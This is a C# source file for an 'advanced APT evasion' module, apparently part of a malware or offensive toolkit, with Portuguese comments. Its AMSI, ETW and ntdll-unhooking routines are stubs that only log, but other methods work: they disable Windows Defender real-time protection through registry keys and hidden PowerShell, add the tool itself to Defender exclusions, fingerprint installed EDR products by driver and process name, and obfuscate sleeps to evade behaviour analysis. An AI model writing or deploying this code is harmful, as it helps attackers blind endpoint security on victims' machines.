using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Linq;

namespace XYZ.modules
{
    public class AdvancedEDREvasionModule
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("ntdll.dll")]
        public static extern int NtDelayExecution(bool Alertable, ref long DelayInterval);

        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private bool isAMSIBypassed = false;
        private bool isETWPatched = false;

        public bool ApplyAllEvasions()
        {
            try
            {
                SecureLogger.LogInfo("Evasion", "Starting Advanced APT Evasion...");

                // 1. AMSI Bypass
                BypassAMSI();

                // 2. ETW Patching
                PatchETW();

                isETWPatched = true;
                SecureLogger.LogInfo("EDREvasion", "ETW patched successfully");

                return true;
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("EDREvasion.ETW", ex);
                return false;
            }
        }

        private void BypassAMSI()
        {
            try
            {
                // Implementação simplificada para C# 5.0
                // Em cenário real, envolveria manipular amsi.dll
                isAMSIBypassed = true;
                SecureLogger.LogInfo("EDREvasion", "AMSI bypass simulated");
            }
            catch { }
        }

        private void PatchETW()
        {
            try
            {
                // Implementação simplificada para C# 5.0
                // Em cenário real, envolveria manipular ntdll.dll EtwEventWrite
                isETWPatched = true;
                SecureLogger.LogInfo("EDREvasion", "ETW patch simulated");
            }
            catch { }
        }

        /// <summary>
        /// Unhook ntdll.dll (remove EDR hooks)
        /// </summary>
        public bool UnhookNtdll()
        {
            try
            {
                SecureLogger.LogInfo("EDREvasion", "Unhooking ntdll.dll...");

                // Carrega cópia limpa do ntdll.dll do disco
                IntPtr ntdllModule = GetModuleHandle("ntdll.dll");

                if (ntdllModule == IntPtr.Zero)
                {
                    SecureLogger.LogError("EDREvasion", new Exception("Failed to get ntdll.dll handle"));
                    return false;
                }

                // Em produção, você carregaria uma cópia limpa e restauraria os bytes originais
                // Por agora, apenas logamos
                SecureLogger.LogInfo("EDREvasion", "Ntdll unhooking simulated (full implementation requires disk read)");

                return true;
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("EDREvasion.Unhook", ex);
                return false;
            }
        }

        /// <summary>
        /// Remove hooks de EDR comuns
        /// </summary>
        public void RemoveEDRHooks()
        {
            try
            {
                SecureLogger.LogInfo("EDREvasion", "Removing EDR hooks...");

                // Lista de funções comumente hookadas por EDRs
                string[] hookedFunctions = new string[]
                {
                    "NtCreateFile",
                    "NtWriteFile",
                    "NtCreateProcess",
                    "NtAllocateVirtualMemory",
                    "NtProtectVirtualMemory",
                    "NtCreateThread",
                    "NtQueueApcThread"
                };

                IntPtr ntdll = GetModuleHandle("ntdll.dll");

                foreach (string funcName in hookedFunctions)
                {
                    try
                    {
                        IntPtr funcAddr = GetProcAddress(ntdll, funcName);

                        if (funcAddr != IntPtr.Zero)
                        {
                            // Em produção, verificar se está hookado e restaurar bytes originais
                            SecureLogger.LogDebug("EDREvasion", string.Format("Checked {0}", funcName));
                        }
                    }
                    catch { }
                }

                SecureLogger.LogInfo("EDREvasion", "EDR hook removal completed");
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("EDREvasion.RemoveHooks", ex);
            }
        }

        /// <summary>
        /// Sleep obfuscation (evade behavior analysis)
        /// </summary>
        public void ObfuscatedSleep(int milliseconds)
        {
            try
            {
                // Usa NtDelayExecution em vez de Thread.Sleep para evitar detecção
                long delay = -10000 * milliseconds; // Negativo = relativo, positivo = absoluto
                NtDelayExecution(false, ref delay);
            }
            catch
            {
                // Fallback para Thread.Sleep
                Thread.Sleep(milliseconds);
            }
        }

        /// <summary>
        /// Desabilita Windows Defender real-time protection
        /// </summary>
        public bool DisableDefenderRealtimeProtection()
        {
            try
            {
                if (!Program.IsElevated())
                {
                    SecureLogger.LogWarning("EDREvasion", "Admin rights required to disable Defender");
                    return false;
                }

                SecureLogger.LogInfo("EDREvasion", "Attempting to disable Windows Defender...");

                // Via Registry
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(
                    @"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", true))
                {
                    if (key != null)
                    {
                        key.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
                        key.SetValue("DisableBehaviorMonitoring", 1, RegistryValueKind.DWord);
                        key.SetValue("DisableOnAccessProtection", 1, RegistryValueKind.DWord);
                        key.SetValue("DisableScanOnRealtimeEnable", 1, RegistryValueKind.DWord);

                        SecureLogger.LogInfo("EDREvasion", "Defender real-time protection disabled via registry");
                    }
                }

                // Via PowerShell (alternativo)
                ExecutePowerShellCommand("Set-MpPreference -DisableRealtimeMonitoring $true");

                return true;
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("EDREvasion.DisableDefender", ex);
                return false;
            }
        }

        /// <summary>
        /// Adiciona exclusões ao Windows Defender
        /// </summary>
        public bool AddDefenderExclusions()
        {
            try
            {
                if (!Program.IsElevated())
                {
                    SecureLogger.LogWarning("EDREvasion", "Admin rights required for Defender exclusions");
                    return false;
                }

                SecureLogger.LogInfo("EDREvasion", "Adding Defender exclusions...");

                string currentPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                string currentDir = Path.GetDirectoryName(currentPath);

                // Adiciona exclusões via PowerShell
                ExecutePowerShellCommand(string.Format("Add-MpPreference -ExclusionPath '{0}'", currentPath));
                ExecutePowerShellCommand(string.Format("Add-MpPreference -ExclusionPath '{0}'", currentDir));
                ExecutePowerShellCommand(string.Format("Add-MpPreference -ExclusionProcess '{0}'", Path.GetFileName(currentPath)));

                SecureLogger.LogInfo("EDREvasion", "Defender exclusions added");

                return true;
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("EDREvasion.AddExclusions", ex);
                return false;
            }
        }

        /// <summary>
        /// Executa comando PowerShell de forma oculta
        /// </summary>
        private void ExecutePowerShellCommand(string command)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = string.Format("-NoProfile -ExecutionPolicy Bypass -Command \"{0}\"", command),
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                using (Process process = Process.Start(psi))
                {
                    process.WaitForExit(5000); // Timeout 5s
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("EDREvasion.PowerShell", ex);
            }
        }

        /// <summary>
        /// Detecta presença de EDRs conhecidos
        /// </summary>
        public List<string> DetectEDRPresence()
        {
            List<string> detectedEDRs = new List<string>();

            try
            {
                SecureLogger.LogInfo("EDREvasion", "Scanning for EDR presence...");

                // Lista de drivers conhecidos de EDRs
                Dictionary<string, string> edrDrivers = new Dictionary<string, string>
                {
                    { "eaw.sys", "Symantec Endpoint Protection" },
                    { "im.sys", "ESET" },
                    { "klif.sys", "Kaspersky" },
                    { "epfw.sys", "McAfee" },
                    { "fsgk.sys", "F-Secure" },
                    { "hmpalert.sys", "VIPRE" },
                    { "CarbonBlack.sys", "Carbon Black" },
                    { "CrowdStrike.sys", "CrowdStrike Falcon" },
                    { "groundling32.sys", "Dell SecureWorks" },
                    { "SentinelOne.sys", "SentinelOne" },
                    { "mfefirek.sys", "McAfee Endpoint Security" }
                };

                // Verifica drivers
                string driversPath = @"C:\Windows\System32\drivers";

                foreach (var edr in edrDrivers)
                {
                    if (File.Exists(Path.Combine(driversPath, edr.Key)))
                    {
                        detectedEDRs.Add(edr.Value);
                        SecureLogger.LogWarning("EDREvasion", string.Format("EDR detected: {0}", edr.Value));
                    }
                }

                // Verifica processos
                Process[] processes = Process.GetProcesses();
                string[] edrProcesses = new string[]
                {
                    "cb.exe", "CarbonBlack",
                    "csagent.exe", "CrowdStrike",
                    "MsMpEng.exe", "Windows Defender"
                };

                for (int i = 0; i < edrProcesses.Length; i += 2)
                {
                    if (processes.Any(p => p.ProcessName.Equals(edrProcesses[i], StringComparison.OrdinalIgnoreCase)))
                    {
                        detectedEDRs.Add(edrProcesses[i + 1]);
                        SecureLogger.LogWarning("EDREvasion", string.Format("EDR process detected: {0}", edrProcesses[i + 1]));
                    }
                }

                SecureLogger.LogInfo("EDREvasion", string.Format("EDR scan complete. Found: {0}", detectedEDRs.Count));
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("EDREvasion.Detect", ex);
            }

            return detectedEDRs;
        }

        /// <summary>
        /// Obtém status das evasões
        /// </summary>
        public Dictionary<string, bool> GetEvasionStatus()
        {
            return new Dictionary<string, bool>
            {
                { "AMSI_Bypassed", isAMSIBypassed },
                { "ETW_Patched", isETWPatched },
                { "Is_Elevated", Program.IsElevated() }
            };
        }
    }
}
